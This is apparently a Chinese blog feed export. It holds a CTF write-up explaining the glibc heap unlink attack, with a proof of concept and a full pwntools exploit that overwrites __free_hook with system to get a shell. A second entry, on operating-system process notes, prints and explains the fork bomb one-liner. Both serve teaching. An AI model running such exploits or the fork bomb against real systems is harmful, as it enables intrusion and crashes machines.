2</code>地址处的值设置为<strong>fd</strong>。<br>  但需要注意的是，<strong>unlink</strong>还会有安全检查:一方面，其会检查传入的<strong>p</strong>是否为合法的chunk;另一方面，其会检查<strong>fd</strong>和<strong>bk</strong>字段是否为有效的，因为如果调用<strong>unlink</strong>，则表明<strong>p</strong>应该是位于双向链表中，则必定有<strong>p-&gt;fd-&gt;bk == p &amp;&amp; p-&gt;bk-&gt;fd == p</strong>(即双向链表中前驱的后继节点和后继的前驱节点都仍然是该节点)。因此，<strong>fd</strong>字段和<strong>bk</strong>字段实际上不能任取。<br>  为了绕过这些检查，我们需要一个稍微苛刻一点的条件——我们需要一个指向正常内存(<strong>chunk</strong>)的指针<strong>ptr</strong>;<strong>ptr</strong>所指向的内存<strong>chunk</strong>已经被释放，其<strong>fd</strong>字段的值设置为<strong>ptr - SIZE_SZ * 3</strong>，即<code>*(chunk + SIZE_SZ * 2) = ptr - SIZE_SZ * 3</code>,其<strong>bk</strong>字段的值设置为<strong>ptr - SIZE_SZ * 2</strong>，即<code>*(chunk + SIZE_SZ * 3) = ptr - SIZE_SZ * 2</code>。其内存对象如下所示<br>  <img src="unlink攻击下chunk内存对象.PNG" alt="unlink攻击下chunk内存对象"></p><p>  此时，当释放<strong>nextchunk</strong>时，<strong>unlink</strong>以为的chunk的双向链表如下所示<br>  <img src="unlink攻击下伪造的双向链表.PNG" alt="unlink攻击下伪造的双向链表"></p><p>  根据chunk内存对象的示意图，可以清楚的看到，其满足检测条件1，即<code>chunksize (chunk) == prev_size (nextchunk)</code>;对于检测条件2，根据伪造的双向链表的示意图，也很容易验证其正确性，即<code>p-&gt;fd-&gt;bk</code>即为<code>(*(chunk + SIZE_SZ * 2))-&gt;bk == (ptr - SIZE_SZ * 3)-&gt;bk == *(ptr - SIZE_SZ * 3 + SIZE_SZ * 3) == *(ptr) == chunk</code>;同理，<code>p-&gt;bk-&gt;fd</code>即为<code>(*(chunk + SIZE_SZ * 3))-&gt;fd == (ptr - SIZE_SZ * 2)-&gt;fd == *(ptr - SIZE_SZ * 2 + SIZE_SZ * 2) == *(ptr) == chunk</code>。<br>  在上述的攻击方式下，有<code>&amp;(p-&gt;fd-&gt;bk) == &amp;(p-&gt;bk-&gt;fd) == ptr</code>，则执行后的结果为<code>*ptr = ptr - 0x18</code></p><h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><p>  可能这里对于<strong>unlink攻击</strong>还是比较困惑，这里给出一个常见的<strong>unlink攻击</strong>的利用姿势</p><p>  如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *ptr1 = (<span class="type">long</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *ptr2 = (<span class="type">long</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p=&gt;%p\n&quot;</span>, &amp;ptr1, ptr1);</span><br><span class="line"></span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x510</span>;</span><br><span class="line">read(<span class="number">0</span>, ptr1, <span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p=&gt;%p\n&quot;</span>, &amp;ptr1, ptr1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其利用漏洞很明显，其在读取数据之前的内存布局如下所示<br>  <img src="unlink攻击的漏洞利用内存布局1.PNG" alt="unlink攻击的漏洞利用内存布局1"></p><p>  我们此时有ptr1指针的地址，并且通过<code>ptr2[-1] = 0x510</code>语句，其相当于ptr2指向的内存对象的物理相邻的chunk已经被释放了。<br>  那么此时恰好有满足unlink攻击的条件——如果我们在ptr1指向的位置伪造一个chunk，其fd和bk字段分别为<strong>ptr1 - SIZE_SZ * 3</strong>和<strong>ptr1 - SIZE_SZ * 2</strong>，其恰好覆盖掉ptr2对象的pre_size字段。则<code>free(ptr2)</code>时，就会发生<strong>unlink攻击</strong>，其内存如下所示<br>  <img src="unlink攻击的漏洞利用内存布局2.PNG" alt="unlink攻击的漏洞利用内存布局2"></p><p>  可以看到，当我们释放掉<strong>ptr2</strong>时，确实会发生<strong>unlink攻击</strong>，其利用和验证脚本如下所示<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">sh = process(<span class="string">&#x27;./unlink-poc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr1_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;=&gt;&#x27;</span>)[<span class="number">2</span>:-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">ptr1_val = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">2</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;ptr1_addr =&gt; %#x, ptr1_val =&gt; %#x&#x27;</span>%(ptr1_addr, ptr1_val))</span><br><span class="line"></span><br><span class="line">sh.send(p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(ptr1_addr - <span class="number">0x18</span>) + p64(ptr1_addr - <span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">ptr1_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;=&gt;&#x27;</span>)[<span class="number">2</span>:-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">ptr1_val = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">2</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;ptr1_addr =&gt; %#x, ptr1_val =&gt; %#x&#x27;</span>%(ptr1_addr, ptr1_val))</span><br></pre></td></tr></table></figure></p><p>  总结一下，一般我们会用指针存储申请的内存地址。因此该指针地址往往就是<strong>unlink攻击</strong>中的<strong>ptr</strong>。但是在<strong>unlink攻击</strong>中，<strong>ptr</strong>指向chunk，而我们指针存储的是chunk加上chunk头大小的偏移，因此我们需要在该指针上伪造一个chunk。<br>  一般我们首先释放掉<strong>ptr</strong>指向的内存对象，然后利用<strong>UAF</strong>或其他手段，在该指针上伪造一个chunk。此时若释放掉其物理相邻的下一个chunk(非<strong>fast bin</strong>或<strong>tcache</strong>)，既可以发生<strong>unlink攻击</strong></p><h1 id="实例-class"><a href="#实例-class" class="headerlink" title="实例 class"></a>实例 class</h1><p>  点击<a href="class.tar.gz">附件链接</a></p><h2 id="保护分析"><a href="#保护分析" class="headerlink" title="保护分析"></a>保护分析</h2><p>  首先查看一下程序相关的保护机制<br>  <img src="保护机制.PNG" alt="保护机制"></p><p>  可以看到，其并没有开启<strong>PIE</strong>保护，则代码段和数据段的地址都是固定的，这其实就为<strong>unlink攻击</strong>做铺垫——可以获取指向申请的内存对象的指针的地址，即前面介绍的<strong>unlink攻击</strong>中的<strong>ptr</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>  首先介绍一下程序的逻辑结构。<br>  整个程序可以大致分为申请课程、修改课程描述、释放课程、申请书、输出书信息、释放书、修改个人介绍和释放个人介绍几个部分。<br>  对于申请课程、申请书等，其皆为简单的内存块申请，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">申请课程</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">take</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( does_have_class )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You have a current class, please dismiss it and try again&quot;</span>);</span><br><span class="line">  <span class="class"><span class="keyword">class</span> =</span> <span class="built_in">malloc</span>(<span class="number">0x38</span>uLL);</span><br><span class="line">  does_have_class = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the class description&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, class, <span class="number">0x37</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">申请书</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( does_have_book )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Please finish reading your current books first&quot;</span>);</span><br><span class="line">  book = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  does_have_book = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what books do you want?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, book, <span class="number">0xFF</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  释放课程、释放书和释放个人介绍都是free申请的内存，但是稍有不同的是释放课程存在<strong>UAF</strong>，会导致<strong>double free</strong>。这里说一下，个人介绍实际上是一个大小为<strong>0x10010</strong>的内存对象，其在最开始申请的。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放课程</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dismiss</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(class);</span><br><span class="line">  does_have_class = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放书</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">drop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( does_have_book )</span><br><span class="line">    <span class="built_in">free</span>(book);</span><br><span class="line">  does_have_book = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放个人介绍</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">     <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">LABEL_12:</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        <span class="built_in">free</span>(profile);</span><br><span class="line">        v3 = <span class="number">1</span>;</span><br><span class="line">        menu(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br></pre></td></tr></table></figure></p><p>  其次是修改课程描述和修改个人介绍，其就是修改内存对象上数据，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">修改课程描述</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !does_have_class )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can just take a class&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your class description&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, class, <span class="number">0x37</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">修改个人介绍</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Input your profile:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, profile, <span class="number">0xFFFF</span>uLL);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure></p><p>  最后，则是输出书信息，即打印内存对象上的数据，这个一般是用来泄漏libc的基址的，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出书信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">view</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( does_have_book != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need to buy some books first&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;These is your books:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, book, <span class="number">0xFF</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  实际上，当程序中有一个异常大的内存对象时，此时可能就需要<strong>malloc_consolidate</strong>做一些事情;当程序关闭了<strong>PIE</strong>保护机制后，则可能会有<strong>unlink攻击</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  对于一般的程序，要想获取shell，则通常需要泄漏glibc的基址。在这个程序里，相关的输出函数只有输出书信息，但是其无法打印释放后的书——则通过<strong>unsorted bin</strong>获取基地址的想法破灭了。由于所有申请内存对象都严格限制了个数和大小，则通过<strong>_IO_2_1_stdout</strong>泄漏的想法也破灭了<br>  但是程序的释放课程处有一个<strong>UAF</strong>，则结合<strong>malloc_consolidate</strong>，很容易产生一个<strong>double free</strong>——即我们有了一个可以任意更改其数据的释放的内存对象;此时在结合未开启<strong>PIE</strong>保护，即又有了一个可以指向该内存对象的指针的地址，则完美符合<strong>unlink攻击</strong>的条件。<br>  有了<strong>unlink攻击</strong>后，我们控制了课程指针周边的内存，其仍然是很多内存的指针，从而我们可以控制这些指针的指向，完成任意地址的任意次读写，那么获取shell就非常简单了，只需要更改<strong>__free_hook</strong>为<strong>system</strong>，将前面的某一个指针指向libc中的’/bin/sh\x00’字符串，然后释放即可</p><p>  当然，这里面还是有较多细节需要注意的——<strong>unlink攻击</strong>需要修改数据，根据上面的思路，只能通过申请课程并修改课程描述实现;但是如果申请课程的话，是否会改变当前chunk的释放情况，即是否会改变<code>prev_inuse (next)</code>，从而导致我们在利用<strong>unlink攻击</strong>的时候，实际上并没有和prev chunk合并，从而导致并没有调用<strong>unlink</strong>呢?<br>  实际上这里的答案当然是不可能的，<del>否则还要这篇博客干什么呢?</del>。这里有一个非常巧的点——申请课程时所申请的内存对象大小属于<strong>fast bin</strong>中，其在释放的时候为了避免合并，不会修改其next chunk的pre_inuse字段;则自然如果申请到的是同一个chunk，也不会更改其next chunk的pre_inuse字段。也就是从<strong>malloc_consolidate</strong>将其pre_inuse置为0后，其申请或释放该内存对象都不会在更改next chunk的pre_inuse字段。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>  这里给出该漏洞利用的具体实现和细节说明</p><p>  根据前面的分析，只要我们成功实现了<strong>unlink攻击</strong>，则后面的利用就很简单了。<br>  总体上，我们首先需要一个可以修改数据的被释放掉的内存对象，即一个<strong>double free</strong>，其相关的代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;Whats your name?\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;hawk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Init your profile:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;hawk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wp_take(r, <span class="string">&#x27;hawk&#x27;</span>)</span><br><span class="line">wp_buy(r, <span class="string">&#x27;hawk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wp_dismiss(r)</span><br><span class="line">wp_delete(r)<span class="comment">#this will call malloc_consolidate()</span></span><br><span class="line">wp_dismiss(r)<span class="comment">#this is in fast bin</span></span><br></pre></td></tr></table></figure></p><p>  当我们释放个人介绍之前(<code>wp_delete(r)</code>之前)，其内存布局就是一个简单的<strong>fast bin</strong>，如下所示<br>  <img src="malloc_consolidate之前的内存布局.PNG" alt="malloc_consolidate之前的内存布局"></p><p>  当我们释放个人介绍之后，根据阅读glibc源代码可知，其会将个人介绍的内存对象释放掉，然后在调用<code>malloc_consolidate</code>，将<strong>fast bin</strong>的内存对象合并并放置在<strong>unsorted bin</strong>中，其内存布局如下所示<br>  <img src="malloc_consolidate之后的内存布局1.PNG" alt="malloc_consolidate之后的内存布局1"></p><p>  为了可以更改该释放的内存对象，从而在其上按照前面的<strong>unlink攻击</strong>姿势伪造一个chunk，则我们利用<strong>UAF</strong>，再次释放课程，从而下次申请的时候直接获取该块，而在<strong>unsorted bin</strong>中的块保持不变，其再次执行<code>wp_dismiss(r)</code>语句后内存布局如下所示<br>  <img src="malloc_consolidate之后的内存布局2.PNG" alt="malloc_consolidate之后的内存布局2"></p><p>  当我们完成<strong>double free</strong>之后，我们已经具备了<strong>unlink攻击</strong>的所需条件——<strong>ptr</strong>指针为<strong>0x6020a8</strong>;可以更改的释放的内存对象为<strong>class</strong>对象。则我们按照前面的姿势，在该可控的内存对象上伪造一个chunk，然后释放相邻的next chunk，实施<strong>unlink攻击</strong>即可，其攻击过程如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class_got = <span class="number">0x6020A8</span></span><br><span class="line">wp_take(r, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(class_got - <span class="number">0x18</span>) + p64(class_got - <span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x30</span>)[:<span class="number">7</span>])<span class="comment">#cause fast bin don&#x27;t change the next_use, and it change in the unsorted bin, so next_use still is 0, and its pre_size is usable, override it to the 0x30</span></span><br><span class="line"></span><br><span class="line">wp_drop(r)<span class="comment"># this is a unlink attack, change the class_got[0] = class_got - 0x18</span></span><br></pre></td></tr></table></figure></p><p>  前面在漏洞利用的时候已经说过了，由于<strong>fast bin</strong>在释放的时候为了避免合并，未修改其next chunk的prev_inuse字段，则其申请到释放后的chunk的话，自然也无需更改——这里申请后，book中的prev_inuse字段仍然为<strong>malloc_consolidate</strong>合并时设置的0，其伪造后的内存布局如下所示<br>  <img src="伪造的内存布局.PNG" alt="伪造的内存布局"></p><p>  当我们释放书时，其检测到prev_inuse字段为0，会根据pre_size字段的值(已经覆盖为0x30)，合并prev chunk(在class上伪造的chunk)。这里稍微分析一下，就很容易发现伪造的chunk绕过了<strong>unlink攻击</strong>的检查，从而将<strong>0x6020a8</strong>处的值更改为<strong>0x602090</strong>，这样修改课程描述，就相当于向<strong>0x602080</strong>处写入数据，其<strong>unlink攻击</strong>后的内存布局如下所示<br>  <img src="unlink攻击后的内存布局.PNG" alt="unlink攻击后的内存布局"></p><p>  同我们完成了<strong>unlink攻击</strong>后，我们可以通过修改book等的指针，从而实现任意地址的读写，那么获取shell就非常简单，其利用代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wp_jump(r, p64(<span class="number">1</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">1</span>) + p64(class_got - <span class="number">0x18</span>))</span><br><span class="line">lib_base = u64((wp_view(r).split(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - lib.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;lib_base =&gt; %#x&#x27;</span>%lib_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wp_jump(r, p64(<span class="number">1</span>) + p64(lib_base + lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()) + p64(<span class="number">1</span>) + p64(lib_base + lib.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">wp_jump(r, p64(lib_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">wp_drop(r)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-五</title>
      <link href="/2021/09/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%94/"/>
      <url>/2021/09/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这几节课加深了对于操作系统的某些方面的了解，下面简单介绍一下进程抽象的相关问题，并实现课程中的M3实验</p><h1 id="进程抽象"><a href="#进程抽象" class="headerlink" title="进程抽象"></a>进程抽象</h1><h2 id="fork系统调用"><a href="#fork系统调用" class="headerlink" title="fork系统调用"></a>fork系统调用</h2><p>  之前我们一直将进程当作一个<strong>状态机</strong>。那么如果我们想要创建一个新的进程，也就是创建一个新的<strong>状态机</strong>即可。<br>  在Linux中，操作系统提供了<strong>fork</strong>系统调用，其会将当前的进程，即当前的状态机(包括内存和寄存器)，完整的复制一份，从而创建了新的进程。<br>  具体的，可以根据<strong>man 2 fork</strong>，查看接口信息，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">On success, the PID of the child process is returned in the parent,  and  0  is</span></span><br><span class="line"><span class="comment">returned  in  the  child.   On  failure, -1 is returned in the parent, no child</span></span><br><span class="line"><span class="comment">process is created, and errno is set to indicate the error.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure></p><h3 id="fork-bomb"><a href="#fork-bomb" class="headerlink" title="fork bomb"></a>fork bomb</h3><p>  自然的，我们可以想到，操作系统管理进程是需要资源的。那么理论上，我们只要不停地创建进程，系统最后会因为资源耗尽而崩溃。<br>  基于这个原理，有一个经典的命令——<strong>fork bomb</strong>，其会以指数级别的增长速度创建进程，从而使进程崩溃。<br>  <strong>fork bomb</strong>的经典命令格式如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:()&#123;:|:&amp;&#125;;:</span><br></pre></td></tr></table></figure></p><p>  可以看到，这个命令有点<strong>tricky</strong>，我们简单的分析一下该命令。<br>  首先，在bash中，<code>:</code>可以作为标识符，也就是其可以作为一个符号，那我们将其更换为一个更美观的标识符<strong>fork</strong>，转换后的命令如下<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">fork</span></span>()&#123;fork|fork&amp;&#125;;fork</span><br></pre></td></tr></table></figure></p><p>  此时可以大致看出来，这就是定义了一个函数，然后在进行调用即可。<strong>bash</strong>中的分号表示一个换行，这里我们在美化一下命令，添加适当的空白和换行，如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">fork</span></span>() &#123;</span><br><span class="line">fork | fork &amp;</span><br><span class="line">&#125;</span><br><span class="line">fork</span><br></pre></td></tr></table></figure></p><p>  可以看到，其以二的幂的增长速度创建进程，从而很快导致系统崩溃</p><h3 id="fork中的缓冲问题"><a href="#fork中的缓冲问题" class="headerlink" title="fork中的缓冲问题"></a>fork中的缓冲问题</h3><p>  实际上，虽然前面介绍<strong>fork</strong>的时候，只是简单的以<strong>将当前的状态机(包括内存和寄存器)复制一份</strong>介绍，但是中间有非常繁杂的细节，例如缓冲问题。<br>  